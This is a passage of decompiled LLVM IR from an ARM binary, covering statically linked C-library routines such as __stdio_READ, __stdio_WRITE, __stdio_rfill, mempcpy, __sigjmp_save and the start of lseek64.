  %v0_18264 = phi i32 [ %v0_18264.pre, %dec_label_pc_18264.loopexit ], [ %v1_181f8, %dec_label_pc_181e0 ]
  %v2_18264 = sub i32 %v1_18264, %v0_18264
  store i32 %v2_18264, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18268

dec_label_pc_18268:                               ; preds = %dec_label_pc_18198, %dec_label_pc_18200, %dec_label_pc_1817c, %dec_label_pc_18264
  %v0_18268 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_1813c, i32* @r5, align 4
  store i32 %v12_1813c, i32* @r7, align 4
  ret i32 %v0_18268

; uselistorder directives
  uselistorder i32 %v0_18220, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_18228, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_18154, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 7, 8, 0, 3, 9, 10, 11, 4, 5, 6, 1, 12, 2, 13 }
  uselistorder i32 18, { 5, 6, 4, 7, 0, 8, 1, 9, 2, 10, 3, 11 }
  uselistorder i32 22, { 1, 0, 11, 2, 3, 4, 5, 6, 12, 13, 7, 8, 9, 10 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_18268, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18250, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18280 = load i32, i32* @r4, align 4
  store i32 %v3_18280, i32* %stack_var_-12, align 4
  %v0_18284 = load i32, i32* %r0.global-to-local, align 4
  %v1_18284 = inttoptr i32 %v0_18284 to i16*
  %v2_18284 = load i16, i16* %v1_18284, align 2
  %v3_18284 = zext i16 %v2_18284 to i32
  store i32 %v3_18284, i32* @r3, align 4
  %v1_18288 = and i32 %v3_18284, 4
  store i32 %v1_18288, i32* @r5, align 4
  %v2_18288 = icmp eq i32 %v1_18288, 0
  store i32 %v0_18284, i32* @r4, align 4
  br i1 %v2_18288, label %dec_label_pc_1829c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1829c:                               ; preds = %entry
  %v1_1829c = icmp slt i32 %arg2, 0
  br i1 %v1_1829c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1829c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1829c, %bb18
  %v1_182a4 = add i32 %v0_18284, 4
  %v2_182a4 = inttoptr i32 %v1_182a4 to i32*
  %v3_182a4 = load i32, i32* %v2_182a4, align 4
  store i32 %v3_182a4, i32* %r0.global-to-local, align 4
  %v1_182a8 = call i32 @__libc_read(i32 %v3_182a4)
  store i32 %v1_182a8, i32* %r0.global-to-local, align 4
  %v5_182b0 = icmp sgt i32 %v1_182a8, 0
  br i1 %v5_182b0, label %.thread7, label %dec_label_pc_182b4

dec_label_pc_182b4:                               ; preds = %bb19
  %v2_182ac = icmp eq i32 %v1_182a8, 0
  %v0_182b4 = load i32, i32* @r4, align 4
  %v1_182b4 = inttoptr i32 %v0_182b4 to i16*
  %v2_182b4 = load i16, i16* %v1_182b4, align 2
  br i1 %v2_182ac, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_182b4
  %v2_182b8 = or i16 %v2_182b4, 4
  store i16 %v2_182b8, i16* %v1_182b4, align 2
  %v1_182d4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_182b4
  %v2_182bc = or i16 %v2_182b4, 8
  store i16 %v2_182bc, i16* %v1_182b4, align 2
  %v1_182c8 = load i32, i32* @r5, align 4
  store i32 %v1_182c8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_182d4 = phi i32 [ %v1_182d4.pre, %bb20 ], [ 0, %bb ], [ %v1_182a8, %bb19 ], [ %v1_182c8, %bb21 ]
  %v2_182d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_182d0, i32* @r4, align 4
  ret i32 %v1_182d4

; uselistorder directives
  uselistorder i16 %v2_182b4, { 1, 0 }
  uselistorder i32 %v1_182a8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1839c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1839c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1839c2, label %dec_label_pc_183a4, label %dec_label_pc_182f4

dec_label_pc_182f4:                               ; preds = %entry, %dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge
  %v0_18300 = phi i32 [ %v0_18300.pre, %dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge ], [ %tmp, %entry ]
  %v0_182fc = phi i32 [ %v5_1830c, %dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge ], [ %arg2, %entry ]
  %v3_182f4 = phi i32 [ %v3_182f4.pre, %dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge ], [ 2147483647, %entry ]
  %v0_182f8.in = phi i32 [ %v5_18310, %dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge ], [ %arg3, %entry ]
  %v3_182f8 = phi i32 [ %v5_18310, %dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge ], [ %arg3, %entry ]
  %v0_182f8 = icmp slt i32 %v0_182f8.in, 0
  %storemerge = select i1 %v0_182f8, i32 %v3_182f4, i32 %v3_182f8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_182fc, i32* %r1.global-to-local, align 4
  %v1_18300 = add i32 %v0_18300, 4
  %v2_18300 = inttoptr i32 %v1_18300 to i32*
  %v3_18300 = load i32, i32* %v2_18300, align 4
  %v3_18304 = call i32 @__GI___libc_write(i32 %v3_18300, i32 %v0_182fc)
  %v1_18308 = icmp slt i32 %v3_18304, 0
  %v2_18308 = icmp eq i32 %v3_18304, 0
  store i1 %v2_18308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18308, label %dec_label_pc_18318, label %dec_label_pc_1839cthread-pre-split

dec_label_pc_18318:                               ; preds = %dec_label_pc_182f4
  %v0_18318 = load i32, i32* @r4, align 4
  %v1_18318 = inttoptr i32 %v0_18318 to i16*
  %v2_18318 = load i16, i16* %v1_18318, align 2
  %v1_1831c = or i16 %v2_18318, 8
  store i16 %v1_1831c, i16* %v1_18318, align 2
  store i32 40808, i32* %r3.global-to-local, align 4
  %v0_18328 = call i32 @__aeabi_read_tp()
  %v3_1832c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1832c = sext i16 %v3_1832c to i32
  store i32 %v4_1832c, i32* %r3.global-to-local, align 4
  %v2_18330 = add i32 %v4_1832c, %v0_18328
  %v3_18330 = inttoptr i32 %v2_18330 to i32*
  %v4_18330 = load i32, i32* %v3_18330, align 4
  store i32 %v4_18330, i32* %r3.global-to-local, align 4
  %v7_18334 = icmp eq i32 %v4_18330, 4
  store i1 %v7_18334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18334, label %dec_label_pc_18340, label %bb21

bb21:                                             ; preds = %dec_label_pc_18318
  %v8_18338 = icmp eq i32 %v4_18330, 11
  store i1 %v8_18338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18338, label %dec_label_pc_18340, label %dec_label_pc_183a4

dec_label_pc_18340:                               ; preds = %dec_label_pc_18318, %bb21
  %v0_18340 = load i32, i32* @r4, align 4
  %v1_18340 = add i32 %v0_18340, 8
  store i32 %v1_18340, i32* %r2.global-to-local, align 4
  %v1_18344 = inttoptr i32 %v1_18340 to i32*
  %v2_18344 = load i32, i32* %v1_18344, align 4
  store i32 %v2_18344, i32* %r2.global-to-local, align 4
  %v3_18344 = add i32 %v0_18340, 12
  %v4_18344 = inttoptr i32 %v3_18344 to i32*
  %v5_18344 = load i32, i32* %v4_18344, align 4
  store i32 %v5_18344, i32* %r3.global-to-local, align 4
  %v2_18348 = sub i32 %v5_18344, %v2_18344
  store i32 %v2_18348, i32* %r1.global-to-local, align 4
  %v9_18348 = icmp eq i32 %v5_18344, %v2_18344
  store i1 %v9_18348, i1* %cpsr_z.global-to-local, align 1
  %v0_18394.pre = load i32, i32* @r5, align 4
  br i1 %v9_18348, label %dec_label_pc_18394, label %dec_label_pc_18350

dec_label_pc_18350:                               ; preds = %dec_label_pc_18340
  %v3_18350 = icmp ult i32 %v2_18348, %v0_18394.pre
  %v9_18350 = icmp eq i32 %v2_18348, %v0_18394.pre
  store i1 %v9_18350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18350, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_18350
  store i32 %v0_18394.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18350, %bb22, %dec_label_pc_18378
  %v2_18364 = phi i32 [ %v1_1837c, %dec_label_pc_18378 ], [ %v2_18344, %bb22 ], [ %v2_18344, %dec_label_pc_18350 ]
  %v0_18358 = load i32, i32* @r6, align 4
  %v1_18358 = inttoptr i32 %v0_18358 to i8*
  %v2_18358 = load i8, i8* %v1_18358, align 1
  %v3_18358 = zext i8 %v2_18358 to i32
  store i32 %v3_18358, i32* %r3.global-to-local, align 4
  %v7_1835c = icmp eq i8 %v2_18358, 10
  store i1 %v7_1835c, i1* %cpsr_z.global-to-local, align 1
  %v1_18360 = add i32 %v0_18358, 1
  store i32 %v1_18360, i32* @r6, align 4
  %v3_18364 = inttoptr i32 %v2_18364 to i8*
  store i8 %v2_18358, i8* %v3_18364, align 1
  %v0_18368 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18368, label %dec_label_pc_1836c, label %dec_label_pc_18378

dec_label_pc_1836c:                               ; preds = %.preheader
  %v0_1836c = load i32, i32* @r4, align 4
  %v1_1836c = inttoptr i32 %v0_1836c to i16*
  %v2_1836c = load i16, i16* %v1_1836c, align 2
  %v3_1836c = zext i16 %v2_1836c to i32
  store i32 %v3_1836c, i32* %r3.global-to-local, align 4
  %v1_18370 = and i32 %v3_1836c, 256
  %v2_18370 = icmp eq i32 %v1_18370, 0
  store i1 %v2_18370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18370, label %dec_label_pc_18378, label %dec_label_pc_1836c.dec_label_pc_18384_crit_edge

dec_label_pc_1836c.dec_label_pc_18384_crit_edge:  ; preds = %dec_label_pc_1836c
  %v0_18388.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18384

dec_label_pc_18378:                               ; preds = %dec_label_pc_1836c, %.preheader
  %v0_18378 = load i32, i32* %r1.global-to-local, align 4
  %v1_18378 = add i32 %v0_18378, -1
  store i32 %v1_18378, i32* %r1.global-to-local, align 4
  %v7_18378 = icmp eq i32 %v0_18378, 1
  store i1 %v7_18378, i1* %cpsr_z.global-to-local, align 1
  %v0_1837c = load i32, i32* %r2.global-to-local, align 4
  %v1_1837c = add i32 %v0_1837c, 1
  store i32 %v1_1837c, i32* %r2.global-to-local, align 4
  br i1 %v7_18378, label %dec_label_pc_18378.dec_label_pc_18384_crit_edge, label %.preheader

dec_label_pc_18378.dec_label_pc_18384_crit_edge:  ; preds = %dec_label_pc_18378
  %v0_18384.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18384

dec_label_pc_18384:                               ; preds = %dec_label_pc_1836c.dec_label_pc_18384_crit_edge, %dec_label_pc_18378.dec_label_pc_18384_crit_edge
  %v0_18388 = phi i32 [ %v1_1837c, %dec_label_pc_18378.dec_label_pc_18384_crit_edge ], [ %v0_18388.pre, %dec_label_pc_1836c.dec_label_pc_18384_crit_edge ]
  %v0_18384 = phi i32 [ %v0_18384.pre, %dec_label_pc_18378.dec_label_pc_18384_crit_edge ], [ %v0_1836c, %dec_label_pc_1836c.dec_label_pc_18384_crit_edge ]
  %v1_18384 = add i32 %v0_18384, 8
  %v2_18384 = inttoptr i32 %v1_18384 to i32*
  %v3_18384 = load i32, i32* %v2_18384, align 4
  store i32 %v3_18384, i32* %r3.global-to-local, align 4
  %v2_18388 = add i32 %v0_18384, 16
  %v3_18388 = inttoptr i32 %v2_18388 to i32*
  store i32 %v0_18388, i32* %v3_18388, align 4
  %v0_1838c = load i32, i32* %r3.global-to-local, align 4
  %v1_1838c = load i32, i32* %r2.global-to-local, align 4
  %v2_1838c = sub i32 %v1_1838c, %v0_1838c
  store i32 %v2_1838c, i32* %r3.global-to-local, align 4
  %v1_18390 = load i32, i32* @r5, align 4
  %v2_18390 = sub i32 %v1_18390, %v2_1838c
  br label %dec_label_pc_18394

dec_label_pc_18394:                               ; preds = %dec_label_pc_18340, %dec_label_pc_18384
  %v0_18394 = phi i32 [ %v2_18390, %dec_label_pc_18384 ], [ %v0_18394.pre, %dec_label_pc_18340 ]
  %v1_18394 = load i32, i32* @r7, align 4
  %v2_18394 = sub i32 %v1_18394, %v0_18394
  store i32 %v2_18394, i32* @r7, align 4
  br label %dec_label_pc_183a4

dec_label_pc_1839cthread-pre-split:               ; preds = %dec_label_pc_182f4
  %v3_1830c = load i32, i32* @r6, align 4
  %v5_1830c = add i32 %v3_1830c, %v3_18304
  store i32 %v5_1830c, i32* @r6, align 4
  %v4_18310 = load i32, i32* @r5, align 4
  %v5_18310 = sub i32 %v4_18310, %v3_18304
  store i32 %v5_18310, i32* @r5, align 4
  %v2_1839c = icmp eq i32 %v5_18310, 0
  store i1 %v2_1839c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1839c, label %dec_label_pc_183a4, label %dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge

dec_label_pc_1839cthread-pre-split.dec_label_pc_182f4_crit_edge: ; preds = %dec_label_pc_1839cthread-pre-split
  %v3_182f4.pre = load i32, i32* @r8, align 4
  %v0_18300.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_182f4

dec_label_pc_183a4:                               ; preds = %dec_label_pc_1839cthread-pre-split, %entry, %bb21, %dec_label_pc_18394
  %v0_183a4 = load i32, i32* @r7, align 4
  ret i32 %v0_183a4

; uselistorder directives
  uselistorder i32 %v5_18310, { 1, 3, 0, 2 }
  uselistorder i32 %v5_1830c, { 1, 0 }
  uselistorder i32 %v0_18384, { 1, 0 }
  uselistorder i32 %v1_1837c, { 0, 2, 1 }
  uselistorder i32 %v0_18378, { 1, 0 }
  uselistorder i32 %v0_18394.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_18344, { 1, 0, 2 }
  uselistorder i32 %v2_18344, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_18304, { 1, 0, 2, 3 }
  uselistorder i32 %v0_182fc, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 12, 9, 10, 11, 19, 26, 27, 3, 4, 5, 13, 14, 15, 6, 16, 0, 17, 18, 20, 21, 7, 22, 8, 23, 1, 24, 2, 25, 28 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_183a4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_18394, { 1, 0 }
  uselistorder label %dec_label_pc_18384, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18340, { 1, 0 }
  uselistorder label %dec_label_pc_182f4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_183b4 = load i32, i32* @r4, align 4
  store i32 %v3_183b4, i32* %stack_var_-8, align 4
  %v1_183b8 = add i32 %arg1, 8
  %v1_183bc = inttoptr i32 %v1_183b8 to i32*
  %v2_183bc = load i32, i32* %v1_183bc, align 4
  store i32 %v2_183bc, i32* @r1, align 4
  %v3_183bc = add i32 %arg1, 12
  %v4_183bc = inttoptr i32 %v3_183bc to i32*
  %v5_183bc = load i32, i32* %v4_183bc, align 4
  %v2_183c0 = sub i32 %v5_183bc, %v2_183bc
  store i32 %v2_183c0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_183c8 = inttoptr i32 %arg1 to i16*
  %v4_183c8 = call i32 @__stdio_READ(i16* %v3_183c8, i32 %v2_183bc, i32 %v2_183c0)
  %v0_183cc = load i32, i32* @r4, align 4
  %v1_183cc = add i32 %v0_183cc, 8
  %v2_183cc = inttoptr i32 %v1_183cc to i32*
  %v3_183cc = load i32, i32* %v2_183cc, align 4
  store i32 %v3_183cc, i32* %r2.global-to-local, align 4
  %v2_183d0 = add i32 %v3_183cc, %v4_183c8
  %v2_183d4 = add i32 %v0_183cc, 20
  %v3_183d4 = inttoptr i32 %v2_183d4 to i32*
  store i32 %v2_183d0, i32* %v3_183d4, align 4
  %v0_183d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_183d8 = load i32, i32* @r4, align 4
  %v2_183d8 = add i32 %v1_183d8, 16
  %v3_183d8 = inttoptr i32 %v2_183d8 to i32*
  store i32 %v0_183d8, i32* %v3_183d8, align 4
  %v2_183dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_183dc, i32* @r4, align 4
  ret i32 %v4_183c8

; uselistorder directives
  uselistorder i32 %v4_183c8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_183e4 = load i32, i32* @r4, align 4
  store i32 %v3_183e4, i32* %stack_var_-12, align 4
  %v0_183e8 = load i32, i32* @r0, align 4
  %v1_183e8 = inttoptr i32 %v0_183e8 to i16*
  %v2_183e8 = load i16, i16* %v1_183e8, align 2
  %v3_183e8 = zext i16 %v2_183e8 to i32
  store i32 %v3_183e8, i32* %r3.global-to-local, align 4
  %v0_183ec = load i32, i32* @r1, align 4
  %v2_183ec = and i32 %v0_183ec, %v3_183e8
  %v4_183ec = icmp eq i32 %v2_183ec, 0
  store i32 %v0_183e8, i32* @r4, align 4
  br i1 %v4_183ec, label %dec_label_pc_183fc, label %dec_label_pc_1840c

dec_label_pc_183fc:                               ; preds = %entry
  %v1_183fc = and i32 %v3_183e8, 2176
  %v2_183fc = icmp eq i32 %v1_183fc, 0
  br i1 %v2_183fc, label %dec_label_pc_18404, label %dec_label_pc_18418

dec_label_pc_18404:                               ; preds = %dec_label_pc_183fc
  %v2_18404 = or i32 %v0_183ec, %v3_183e8
  store i32 %v2_18404, i32* %r3.global-to-local, align 4
  %v1_18408 = trunc i32 %v2_18404 to i16
  store i16 %v1_18408, i16* %v1_183e8, align 2
  %v0_1840c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1840c

dec_label_pc_1840c:                               ; preds = %entry, %dec_label_pc_18404
  %v0_1840c = phi i32 [ %v0_183e8, %entry ], [ %v0_1840c.pre, %dec_label_pc_18404 ]
  %v1_1840c = inttoptr i32 %v0_1840c to i16*
  %v2_1840c = load i16, i16* %v1_1840c, align 2
  %v3_1840c = zext i16 %v2_1840c to i32
  store i32 %v3_1840c, i32* %r3.global-to-local, align 4
  %v1_18410 = and i32 %v3_1840c, 16
  store i32 %v1_18410, i32* %r5.global-to-local, align 4
  %v2_18410 = icmp eq i32 %v1_18410, 0
  br i1 %v2_18410, label %dec_label_pc_18440, label %dec_label_pc_18418

dec_label_pc_18418:                               ; preds = %dec_label_pc_183fc, %dec_label_pc_1840c
  store i32 40564, i32* %r3.global-to-local, align 4
  %v0_1841c = call i32 @__aeabi_read_tp()
  store i32 %v0_1841c, i32* %r0.global-to-local, align 4
  %v3_18420 = load i16, i16* @global_var_2229c.359, align 2
  %v4_18420 = sext i16 %v3_18420 to i32
  store i32 %v4_18420, i32* %r3.global-to-local, align 4
  %v3_18428 = add i32 %v4_18420, %v0_1841c
  %v4_18428 = inttoptr i32 %v3_18428 to i32*
  store i32 9, i32* %v4_18428, align 4
  br label %dec_label_pc_1842c

dec_label_pc_1842c:                               ; preds = %dec_label_pc_18448, %dec_label_pc_18418
  %v0_1842c = load i32, i32* @r4, align 4
  %v1_1842c = inttoptr i32 %v0_1842c to i16*
  %v2_1842c = load i16, i16* %v1_1842c, align 2
  %v3_1842c = zext i16 %v2_1842c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18434 = or i32 %v3_1842c, 8
  store i32 %v1_18434, i32* %r3.global-to-local, align 4
  %v1_18438 = trunc i32 %v1_18434 to i16
  store i16 %v1_18438, i16* %v1_1842c, align 2
  %v1_18480.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18478

dec_label_pc_18440:                               ; preds = %dec_label_pc_1840c
  %v1_18440 = and i32 %v3_1840c, 64
  %v2_18440 = icmp eq i32 %v1_18440, 0
  br i1 %v2_18440, label %dec_label_pc_18468, label %dec_label_pc_18448

dec_label_pc_18448:                               ; preds = %dec_label_pc_18440
  %v0_18448 = load i32, i32* @r0, align 4
  %v1_18448 = call i32 @__stdio_wcommit(i32 %v0_18448)
  store i32 %v1_18448, i32* %r0.global-to-local, align 4
  %v2_1844c = icmp eq i32 %v1_18448, 0
  br i1 %v2_1844c, label %dec_label_pc_18454, label %dec_label_pc_1842c

dec_label_pc_18454:                               ; preds = %dec_label_pc_18448
  %v0_18454 = load i32, i32* @r4, align 4
  %v1_18454 = inttoptr i32 %v0_18454 to i16*
  %v2_18454 = load i16, i16* %v1_18454, align 2
  %v3_18454 = zext i16 %v2_18454 to i32
  store i32 %v3_18454, i32* %r3.global-to-local, align 4
  %v1_18458 = add i32 %v0_18454, 8
  %v2_18458 = inttoptr i32 %v1_18458 to i32*
  %v3_18458 = load i32, i32* %v2_18458, align 4
  %v1_1845c = and i32 %v3_18454, 65471
  store i32 %v1_1845c, i32* %r3.global-to-local, align 4
  %v2_18460 = add i32 %v0_18454, 28
  %v3_18460 = inttoptr i32 %v2_18460 to i32*
  store i32 %v3_18458, i32* %v3_18460, align 4
  %v0_18464 = load i32, i32* %r3.global-to-local, align 4
  %v1_18464 = trunc i32 %v0_18464 to i16
  %v2_18464 = load i32, i32* @r4, align 4
  %v3_18464 = inttoptr i32 %v2_18464 to i16*
  store i16 %v1_18464, i16* %v3_18464, align 2
  %v0_18468.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18468

dec_label_pc_18468:                               ; preds = %dec_label_pc_18440, %dec_label_pc_18454
  %v2_18470 = phi i32 [ %v0_1840c, %dec_label_pc_18440 ], [ %v0_18468.pre, %dec_label_pc_18454 ]
  %v1_18468 = inttoptr i32 %v2_18470 to i16*
  %v2_18468 = load i16, i16* %v1_18468, align 2
  %v3_18468 = zext i16 %v2_18468 to i32
  %v1_1846c = or i32 %v3_18468, 1
  store i32 %v1_1846c, i32* %r3.global-to-local, align 4
  %v1_18470 = trunc i32 %v1_1846c to i16
  store i16 %v1_18470, i16* %v1_18468, align 2
  %v0_18474 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18478

dec_label_pc_18478:                               ; preds = %dec_label_pc_1842c, %dec_label_pc_18468
  %v1_18480 = phi i32 [ %v1_18480.pre, %dec_label_pc_1842c ], [ %v0_18474, %dec_label_pc_18468 ]
  %v2_1847c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1847c, i32* @r4, align 4
  ret i32 %v1_18480

; uselistorder directives
  uselistorder i32 %v3_183e8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18478, { 1, 0 }
  uselistorder label %dec_label_pc_18468, { 1, 0 }
  uselistorder label %dec_label_pc_18418, { 1, 0 }
  uselistorder label %dec_label_pc_1840c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_18488 = load i32, i32* @r4, align 4
  %v6_18488 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_18498 = call i32 @memcpy()
  %v0_1849c = load i32, i32* @r5, align 4
  %v1_1849c = load i32, i32* @r4, align 4
  %v2_1849c = add i32 %v1_1849c, %v0_1849c
  store i32 %v3_18488, i32* @r4, align 4
  store i32 %v6_18488, i32* @r5, align 4
  ret i32 %v2_1849c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_184ac = load i32, i32* @r1, align 4
  %v2_184ac = icmp eq i32 %v0_184ac, 0
  %v3_184b0 = load i32, i32* @r4, align 4
  store i32 %v3_184b0, i32* %stack_var_-8, align 4
  %v0_184b4 = load i32, i32* @r0, align 4
  store i32 %v0_184b4, i32* %r4.global-to-local, align 4
  br i1 %v2_184ac, label %dec_label_pc_184d8, label %dec_label_pc_184bc

dec_label_pc_184bc:                               ; preds = %entry
  %v1_184c4 = add i32 %v0_184b4, 260
  %v4_184c8 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_184c4)
  %v2_184cc = icmp eq i32 %v4_184c8, 0
  br i1 %v2_184cc, label %dec_label_pc_184dc, label %dec_label_pc_184d8

dec_label_pc_184d8:                               ; preds = %dec_label_pc_184bc, %entry
  br label %dec_label_pc_184dc

dec_label_pc_184dc:                               ; preds = %dec_label_pc_184bc, %dec_label_pc_184d8
  %storemerge = phi i32 [ 0, %dec_label_pc_184d8 ], [ 1, %dec_label_pc_184bc ]
  %v1_184e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_184e0 = add i32 %v1_184e0, 256
  %v3_184e0 = inttoptr i32 %v2_184e0 to i32*
  store i32 %storemerge, i32* %v3_184e0, align 4
  %v2_184e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_184e4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 3, 24, 4, 25 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_184dc, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_18534, label %dec_label_pc_18518

dec_label_pc_18518:                               ; preds = %entry
  %v0_1851c = call i32 @__aeabi_read_tp()
  %v3_18520 = load i16, i16* @global_var_2229c.359, align 2
  %v4_18520 = sext i16 %v3_18520 to i32
  %v0_18524 = load i32, i32* %r2.global-to-local, align 4
  %v1_18524 = sub i32 0, %v0_18524
  store i32 %v1_18524, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
